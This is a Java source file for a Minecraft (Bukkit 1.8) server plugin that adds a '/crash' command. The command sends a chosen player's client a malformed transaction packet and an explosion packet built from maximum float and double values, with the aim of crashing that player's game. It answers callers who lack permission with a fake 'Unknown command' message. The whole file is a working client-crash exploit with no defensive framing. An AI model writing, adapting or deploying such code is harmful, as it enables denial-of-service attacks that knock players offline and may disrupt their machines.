package me.electrum.crash.commands;

import me.electrum.crash.Main;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutTransaction;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class CrashCommand implements CommandExecutor {
    @SuppressWarnings("ALL")
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("crash")) {

            if (!sender.hasPermission("crash.player")) {
                sender.sendMessage("Unknown command");
                return true;
            }

            if (args.length > 0) {
                Player target = Bukkit.getPlayer(args[0]);

                if (target != null) {
                   boolean work = true;

                   if (Main.instance.getConfig().getBoolean("crash.bypass") && target.hasPermission("crash.bypass")) {
                       sender.sendMessage(ChatColor.RED + "You cannot crash this player");
                       work = false;
                   }
                   if (work) {
                       ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutTransaction
                               (Float.MAX_EXPONENT, (short) Float.MAX_EXPONENT, false));
                       ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                               Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                               Float.MAX_VALUE, Collections.EMPTY_LIST,
                               new Vec3D(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)));
                       sender.sendMessage(ChatColor.GREEN + "Crashed " + target.getDisplayName());
                   }
                } else {
                    sender.sendMessage(ChatColor.RED + "That player isnt online");
                }
            } else {
                sender.sendMessage(ChatColor.RED + "Provide a player");
            }
            return true;
        }
        return true;
    }
}